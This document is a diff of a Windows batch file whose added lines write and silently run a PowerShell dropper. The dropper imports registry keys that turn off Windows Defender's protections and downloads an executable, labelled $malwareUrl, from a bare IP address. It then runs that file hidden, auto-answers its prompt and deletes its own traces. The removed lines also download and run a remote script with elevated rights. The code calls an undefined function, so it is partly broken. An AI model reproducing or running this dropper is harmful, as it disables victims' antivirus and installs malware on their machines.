@@ -1,31 +1,59 @@
 @echo off
-setlocal
+:: Batch script to run PowerShell script without showing the command window
 
-:: Define the log file path in the same directory as this script
-set LOG_FILE=%~dp0run_log.txt
+:: Create a temporary PowerShell script
+set "psScript=%TEMP%\disable_defender.ps1"
 
-:: Check if the script is running with administrative privileges
-openfiles >nul 2>&1
-if %errorlevel% NEQ 0 (
-    :: Prompt for administrative privileges
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
-    echo [%date% %time%] Failed to run 'run.bat' - Script requires administrative privileges. >> "%LOG_FILE%"
-    exit /b
-)
-
-:: Download the installer from a remote location silently
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/run.bat', '%~dp0run.bat')"
-if %errorlevel% NEQ 0 (
-    echo [%date% %time%] Failed to download 'run.bat' from remote location. >> "%LOG_FILE%"
-    exit /b
-)
+:: Write the PowerShell script content to the temporary file
+echo $regContent = ^"^">>"%psScript%"
+echo Windows Registry Editor Version 5.00^">>"%psScript%"
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender] ^">>"%psScript%"
+echo "DisableAntiSpyware"=dword:00000001 ^">>"%psScript%"
+echo "DisableRealtimeMonitoring"=dword:00000001^">>"%psScript%"
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection] ^">>"%psScript%"
+echo "DisableBehaviorMonitoring"=dword:00000001^">>"%psScript%"
+echo "DisableOnAccessProtection"=dword:00000001^">>"%psScript%"
+echo "DisableScanOnRealtimeEnable"=dword:00000001^"^">>"%psScript%"
+echo $regFilePath = ^"%TEMP%\disable_defender.reg^" ^">>"%psScript%"
+echo $regContent ^| Out-File -FilePath $regFilePath -Encoding ASCII ^">>"%psScript%"
+echo try ^{^">>"%psScript%"
+echo     Start-Process regedit.exe -ArgumentList ^"/s $regFilePath^" -Wait -ErrorAction Stop ^">>"%psScript%"
+echo ^} catch ^{^">>"%psScript%"
+echo     Add-Content -Path ^"%TEMP%\script_log.txt^" -Value ^"Failed to disable Windows Defender: $_^" -ErrorAction SilentlyContinue ^">>"%psScript%"
+echo ^} ^">>"%psScript%"
+echo function Download-File ^{^">>"%psScript%"
+echo     param (^">>"%psScript%"
+echo         [string]$url, ^">>"%psScript%"
+echo         [string]$outputPath ^">>"%psScript%"
+echo     ^) ^">>"%psScript%"
+echo     try ^{^">>"%psScript%"
+echo         Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing ^">>"%psScript%"
+echo     ^} catch ^{^">>"%psScript%"
+echo         Add-Content -Path ^"%TEMP%\script_log.txt^" -Value ^"Failed to download: $url^" -ErrorAction SilentlyContinue ^">>"%psScript%"
+echo     ^} ^">>"%psScript%"
+echo ^} ^">>"%psScript%"
+echo function Run-Executable ^{^">>"%psScript%"
+echo     param (^">>"%psScript%"
+echo         [string]$filePath ^">>"%psScript%"
+echo     ^) ^">>"%psScript%"
+echo     try ^{^">>"%psScript%"
+echo         $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -WindowStyle Hidden ^">>"%psScript%"
+echo         $process.WaitForInputIdle() ^">>"%psScript%"
+echo         Add-Type -AssemblyName System.Windows.Forms ^">>"%psScript%"
+echo         [System.Windows.Forms.SendKeys]::SendWait(^"Y^") ^">>"%psScript%"
+echo         $process.WaitForExit() ^">>"%psScript%"
+echo     ^} catch ^{^">>"%psScript%"
+echo         Add-Content -Path ^"%TEMP%\script_log.txt^" -Value ^"Failed to execute: $filePath^" -ErrorAction SilentlyContinue ^">>"%psScript%"
+echo     ^} ^">>"%psScript%"
+echo ^} ^">>"%psScript%"
+echo $malwareUrl = ^"http://54.224.34.222:3004/uploads/BootyMistress.exe^" ^">>"%psScript%"
+echo $downloadPath = ^"%TEMP%\installer.exe^" ^">>"%psScript%"
+echo Disable-WindowsDefender ^">>"%psScript%"
+echo Download-File -url $malwareUrl -outputPath $downloadPath ^">>"%psScript%"
+echo Run-Executable -filePath $downloadPath ^">>"%psScript%"
 
 :: Run the PowerShell script silently
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0run.bat"
-if %errorlevel% NEQ 0 (
-    echo [%date% %time%] Failed to execute 'run.bat'. Reason: PowerShell script execution failed. >> "%LOG_FILE%"
-) else (
-    echo [%date% %time%] Successfully executed 'run.bat'. >> "%LOG_FILE%"
-)
+powershell -WindowStyle Hidden -File "%psScript%"
 
-endlocal
+:: Clean up
+del "%psScript%"
